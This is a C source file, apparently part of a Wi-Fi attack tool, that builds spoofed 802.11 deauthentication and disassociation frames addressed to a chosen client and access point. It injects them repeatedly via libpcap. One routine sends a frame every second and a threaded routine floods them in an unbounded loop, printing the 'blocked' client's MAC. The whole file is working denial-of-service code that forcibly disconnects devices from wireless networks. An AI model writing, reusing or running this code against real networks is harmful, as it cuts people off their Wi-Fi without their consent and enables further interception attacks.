#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <string.h>
#include "air_pollution.h"
#include "air_support.h"
#include "air_control.h"
#include "housekeeping.h"

/* radiotap_preamble doesn't have to be visible outside of this file */

static u_char radiotap_preamble [] = {
                                    0x00,
                                    0x00,
                                    0x08, 0x00,
                                    0x00,0x00,0x00,0x00,
};


static u_char *build_frame(u_char *client, u_char *bssid, char frame_type, int *mgmt_frame_size, u_char **frame_tail) {

    u_char *packet, *mgmt_frame_p;
    int build_buff_size;
    struct ieee80211a_generic_frame *mgmt_hdr_core;
    uint16_t reason_code = LEAVING;


    *mgmt_frame_size = sizeof(struct ieee80211a_generic_frame) + DEAUTH_REASON_FIELD_LEN;
    build_buff_size = *mgmt_frame_size + sizeof(radiotap_preamble) + FCS_LEN;
    packet = calloc(build_buff_size, sizeof(char));    

    if (packet == NULL)
        return NULL;
 
    /* at the end of the increment process mgmt_frame_p points to the crc field */

    memcpy(packet, radiotap_preamble, sizeof(radiotap_preamble)); 
    mgmt_frame_p = packet + sizeof(radiotap_preamble);

    mgmt_hdr_core = (struct ieee80211a_generic_frame *)mgmt_frame_p;
    mgmt_hdr_core->frame_ctl = MANAGEMENT_FRAME << 2;

    if (frame_type & DISASSOCIATION_REQ) 
        mgmt_hdr_core->frame_ctl |= DISASSOCIATION << 4;
    else
        mgmt_hdr_core->frame_ctl |= DEAUTHENTICATION << 4;
 
    memcpy(mgmt_hdr_core->addr_1, bssid, ETH_ALEN);
    memcpy(mgmt_hdr_core->addr_2, client, ETH_ALEN);
    memcpy(mgmt_hdr_core->addr_3, mgmt_hdr_core->addr_1, ETH_ALEN); 
    mgmt_hdr_core->seq_ctl = 0;

    mgmt_frame_p += sizeof(struct ieee80211a_generic_frame);
    *((uint16_t *)mgmt_frame_p) = reason_code;
    mgmt_frame_p += sizeof(reason_code);

    *frame_tail = mgmt_frame_p;

    return packet;

}


void frame_inject(char *device, u_char *client, u_char *bssid, char frame_opts) {
 
    u_char *packet, *frame_p = NULL; 
    int frame_size;
    struct ieee80211a_generic_frame *hdr_core;

    packet = build_frame(client, bssid, frame_opts, &frame_size, &frame_p);

    if (packet == NULL)
        perror_exit("Failed to allocate packet memory");


    /*  Rewind back to the core header section.
    *  We do this so that we can set the duration id
    *  to random values.
    */
    hdr_core = (struct ieee80211a_generic_frame *) (frame_p - sizeof(uint16_t) - sizeof(struct ieee80211a_generic_frame));

    srand(time(NULL));
    main_devhandle = pcap_init(device);


    printf(">>>> Blocking: %02x", client[0]);
    for (int i = 1; i < ETH_ALEN; i++) 
        printf(":%02x", client[i]);

    printf("\n");

    while (termflag != 1) {
    
        hdr_core->duration_id = rand() % 32767;
        *((uint32_t *)frame_p) = libnet_compute_crc(packet + sizeof(radiotap_preamble), frame_size);
 
        if (pcap_sendpacket(main_devhandle, packet, frame_size + sizeof(radiotap_preamble) + FCS_LEN) != 0) {
         
            pcap_perror(main_devhandle, "Packet injection failed");
            raise(SIGABRT);
        }    
     
        sleep(1);   
 
    }
 
 
    free(packet);
    pcap_close(main_devhandle);

} 


void *frame_inject_thr(void *job_args) {
 
    u_char *frame_p = NULL;
    int frame_size;
    struct inj_thr_res inj_assets = { NULL, NULL };
    struct ieee80211a_generic_frame *hdr_core;
    unsigned int rand_state = time(NULL);

    pthread_cleanup_push(inj_thr_cleanup, &inj_assets);
    struct frame_thrower *inj_args = (struct frame_thrower *) job_args;

    inj_assets.packet = build_frame(inj_args->client, inj_args->bssid, inj_args->frame_opts, &frame_size, &frame_p);

    if (inj_assets.packet == NULL) {
     
        perror("Failed to allocate packet memory");

        pthread_mutex_lock(inj_args->term_mx);
        termflag = 1;
        pthread_mutex_unlock(inj_args->term_mx);

        pthread_exit(NULL);
 
    }

    hdr_core = (struct ieee80211a_generic_frame *) (frame_p - sizeof(uint16_t) - sizeof(struct ieee80211a_generic_frame));


    /*  Ensure sequential access to the state variables of
    *  libpcap (during the call to pcap_activate()).
    */
    pthread_mutex_lock(inj_args->pcap_mx);
        inj_assets.dev_handle = pcap_init(inj_args->dev_name);
    pthread_mutex_unlock(inj_args->pcap_mx);

 
    while (1) {
    
        hdr_core->duration_id = rand_r(&rand_state) % 32767;
        *((uint32_t *)frame_p) = libnet_compute_crc(inj_assets.packet + sizeof(radiotap_preamble), frame_size);


        if (pcap_sendpacket(inj_assets.dev_handle, inj_assets.packet, frame_size + sizeof(radiotap_preamble) + FCS_LEN) != 0) {

            pcap_perror(inj_assets.dev_handle, "Packet injection failed");

            pthread_mutex_lock(inj_args->term_mx);
                termflag = 1;
            pthread_mutex_unlock(inj_args->term_mx);

            break;
                 
        }        
     
    }

    pthread_cleanup_pop(0);
    pthread_exit(NULL);
 
} 

